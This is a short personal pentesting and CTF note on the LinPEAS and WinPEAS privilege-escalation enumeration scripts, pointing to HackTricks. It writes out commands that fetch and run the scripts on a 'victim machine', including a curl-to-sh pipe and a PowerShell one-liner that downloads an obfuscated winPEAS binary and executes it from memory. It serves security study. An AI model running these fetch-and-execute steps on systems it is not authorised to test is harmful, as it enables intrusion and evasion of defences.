---
Created:  '2021-08-17 08:29:36 +01:00'
Modified: '2021-08-17 08:29:36 +01:00'
---

| Tags: #tools #ctf #pentesting #infosec #kali #windows |
| -------------------------------------------- |

---

> # Key Takeaways / Things to Remember
> 
> Main supporting resource is full of great info:
> [HackTricks](https://book.hacktricks.xyz/)

---



# LinPEAS & WinPEAS

Some automated enumeration of Linux and Windows hosts.
([CTF Katana](https://github.com/JohnHammond/katana) is similar)

Detailed documentation about a lot of the potential exploits is here: https://book.hacktricks.xyz/
The script will attempt to highlight parts of the output which might be vulnerable to escalation attacks. The documentation above can help with understanding the specific vulnerability.

## [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Various other methods of getting it onto a victim machine depending on how secure it is.

Can be downloaded from github and run with:
```bash
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh >linpeas.out
less -R linpeas.out
```

Or can be piped directly into `sh` without saving script on system with:
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

---
## WinPEAS
Again, various options for getting and running on target machine (exe, bat, obfuscated, ...).

One liner to download and execute `winPEASany` from memory in a PS shell:
```powershell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

<br>
Load from disk in memory and execute:

```powershell
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
```
---


| Sources:                                |
| --------------------------------------- |
| https://github.com/carlospolop/PEASS-ng |
| https://book.hacktricks.xyz/ |